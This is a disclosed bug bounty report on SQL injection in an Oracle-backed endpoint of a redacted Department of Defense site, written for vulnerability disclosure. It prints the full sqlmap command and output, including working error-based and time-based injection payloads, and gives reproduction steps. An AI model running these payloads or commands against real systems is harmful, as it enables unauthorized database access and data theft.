# SQL injection on https://███████

## Report Details
- **Report ID**: 214798
- **URL**: https://hackerone.com/reports/214798
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-20T05:39:03.589Z
- **Disclosed**: 2019-12-02T18:43:51.892Z

## Reporter
- **Username**: daveysec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
The `c0-param0` parameter of https://███/██████████/dwr/exec/EndUserSvc.validateCageCode?callCount=1&c0-scriptName=EndUserSvc&c0-methodName=validateCageCode&c0-id=5096_1489967152565&c0-param0=string:1 is vulnerable to SQL injection.

**Description:**
By inserting a single quote after the `1` in the `string:1` value of the `c0-param0` parameter I received an Oracle SQL error. Using the SQLMap tool I was able to confirm this parameter is indeed vulnerable to SQL injection.
SQLMap command and output:

```
root@kali:~/bugbounty# sqlmap -u "https://████/█████████/dwr/exec/EndUserSvc.validateCageCode?callCount=1&c0-scriptName=EndUserSvc&c0-methodName=validateCageCode&c0-id=5096_1489967152565&c0-param0=string:1*"
         _
 ___ ___| |_____ ___ ___  {1.0.8.2#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:21:54

custom injection marking character ('*') found in option '-u'. Do you want to pry
[20:22:03] [INFO] testing connection to the target URL
[20:22:04] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[20:22:04] [INFO] testing if the target URL is stable
[20:22:05] [INFO] target URL is stable
[20:22:05] [INFO] testing if URI parameter '#1*' is dynamic
[20:22:05] [WARNING] URI parameter '#1*' does not appear dynamic
[20:22:05] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'Oracle')
[20:22:05] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'Oracle'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'Oracle' extending provided level (1) and risk (1) values? [Y/n] y
[20:22:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:22:20] [WARNING] reflective value(s) found and filtering out
[20:22:21] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[20:22:22] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[20:22:22] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[20:22:23] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[20:22:24] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[20:22:39] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:22:50] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
[20:23:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[20:23:10] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[20:23:21] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[20:23:33] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[20:23:42] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[20:23:43] [INFO] URI parameter '#1*' is 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' injectable 
[20:23:43] [INFO] testing 'Oracle inline queries'
[20:23:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:23:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
[20:23:43] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[20:23:44] [INFO] testing 'Oracle stacked queries (heavy query)'
[20:23:44] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
[20:23:44] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
[20:23:44] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
[20:23:44] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
[20:23:45] [INFO] testing 'Oracle AND time-based blind'
[20:23:45] [INFO] testing 'Oracle OR time-based blind'
[20:23:45] [INFO] testing 'Oracle AND time-based blind (comment)'
[20:23:45] [INFO] testing 'Oracle OR time-based blind (comment)'
[20:23:45] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[20:24:16] [WARNING] turning off pre-connect mechanism because of connection time out(s)
[20:24:46] [INFO] URI parameter '#1*' appears to be 'Oracle AND time-based blind (heavy query)' injectable 
[20:24:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 418 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: error-based
    Title: Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)
    Payload: https://█████:443/█████/dwr/exec/EndUserSvc.validateCageCode?callCount=1&c0-scriptName=EndUserSvc&c0-methodName=validateCageCode&c0-id=5096_1489967152565&c0-param0=string:1' AND 9965=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(106)||CHR(106)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (9965=9965) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(98)||CHR(112)||CHR(113)))-- Goij

    Type: AND/OR time-based blind
    Title: Oracle AND time-based blind (heavy query)
    Payload: https://██████:443/████/dwr/exec/EndUserSvc.validateCageCode?callCount=1&c0-scriptName=EndUserSvc&c0-methodName=validateCageCode&c0-id=5096_1489967152565&c0-param0=string:1' AND 4917=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- vKNF
---
[20:34:42] [INFO] the back-end DBMS is Oracle
back-end DBMS: Oracle
[20:34:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/██████████'

[*] shutting down at 20:34:42
```
## Impact
Compromise of data stored in the database. Possibility of achieving RCE on the server through SQL injection.

## Step-by-step Reproduction Instructions

1.run the following command with SQLMap 1.0.8.2 `sqlmap -u "https://█████/███/dwr/exec/EndUserSvc.validateCageCode?callCount=1&c0-scriptName=EndUserSvc&c0-methodName=validateCageCode&c0-id=5096_1489967152565&c0-param0=string:1*"`
2. It will show that it is injectable and from there further data can be extracted from the database.

## Product, Version, and Configuration (If applicable)
SQLMap 1.0.8.2

## Suggested Mitigation/Remediation Actions
Properly escape input from users when inserting into SQL queries.

## Attachments
No attachments
